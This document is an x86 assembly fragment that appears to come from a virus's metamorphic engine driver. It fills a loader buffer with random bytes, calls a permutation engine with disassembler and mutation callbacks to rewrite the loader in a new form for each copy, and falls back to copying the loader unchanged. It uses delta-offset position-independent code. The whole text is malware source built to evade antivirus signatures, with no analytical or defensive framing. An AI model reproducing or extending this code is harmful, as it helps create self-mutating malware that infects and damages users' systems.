locals __
locals @@
__x equ rec

MAXMEM                  equ     80000h  ;512k

randseed                dd      12345678h
mem_count               dd      ?
mem_buf                 dd      ?


permutate:
	push 4 ptr [loaderbuf]	; outbuf
	pop edi
	mov ecx, loader_size*loader_mult
__rnd_fill:
	rdtsc
	push eax
	push eax
	call my_rnd
	add esp, 4*2
	stosb
	loop __rnd_fill	

	mov eax, MAXMEM
	call _valloc
	mov [ebp+mem_buf-__x], eax
	jz __perm_ret2
	sub ecx, ecx
	mov 4 ptr [ebp+mem_count-__x], ecx
	mov eax, [tbl]
	mov [ebp+__tbl_addr-__x], eax
	; вызов движка 
	lea eax, [ebp+my_malloc-__x]
	push eax
	lea eax, [ebp+my_disasm-__x]
	push eax
	lea eax, [ebp+my_mutate-__x]
	push eax
	lea eax, [ebp+my_rnd-__x]
	push eax
C_JPROB	equ 	30
	push C_JPROB	; jmp_prob
	push ecx	; extrelfix
	push -1	; ofiller
	push ecx		; out_ep_offset
	push	loader_size*loader_mult	; outbuf_size
	push 4 ptr [loaderbuf]	; outbuf
	push ecx		; in_ep_offset = 0
	push loader_size	; inbuf_size
	lea eax, [ebp+_loader-__x]
	push eax	; inbuf
	push 666
	call engine
	add     esp, 14*4
;int 3
	or eax, eax
	jz __perm_ret1
	; if permurtation failed, copy loader without permutation
	lea esi, [ebp+_loader-__x]
	mov edi, [loaderbuf]
	push loader_size
	pop ecx
	mov [ebp+vloader_size-__x], ecx
	rep movsb
	
__perm_ret1:
	mov eax, [ebp+mem_buf-__x]
	call _vfree
__perm_ret2:	
	ret

my_malloc:              		; fuck 
	mov     eax, [esp+8]
;	call _valloc
	push ebp
	call delta9
delta9:
	pop ebp
	sub ebp, (delta9-recalc)
	add eax, [ebp+mem_count-__x]
	cmp eax, MAXMEM
	jae @@1
	xchg [ebp+mem_count-__x], eax
	add eax, [ebp+mem_buf-__x]
	pop ebp
	retn
@@1:                    
	pop ebp	
	sub eax, eax
	ret

my_disasm:              
	push    dword ptr [esp+8]
	push 12345678h
__tbl_addr	equ $-4
	call    disasm_main
	add esp, 4*2
	retn

my_mutate:
	jmp     mutate

my_rnd:                 
	push ebp
	call delta10
delta10:
	pop ebp
	sub ebp, (delta10-recalc)
	mov     eax, [ebp+randseed-__x]
	imul    eax, 214013
	add     eax, 2531011
	mov     [ebp+randseed-__x], eax
	shr     eax, 16
	imul    eax, [esp+12]
	shr     eax, 16
	pop ebp

;	push edx
;	rdtsc	; fuck
;	pop edx

	retn

engine:
include                 rpme-krn.inc ; engine:
mutate:
include                 rpme-mut.inc ; mutate:

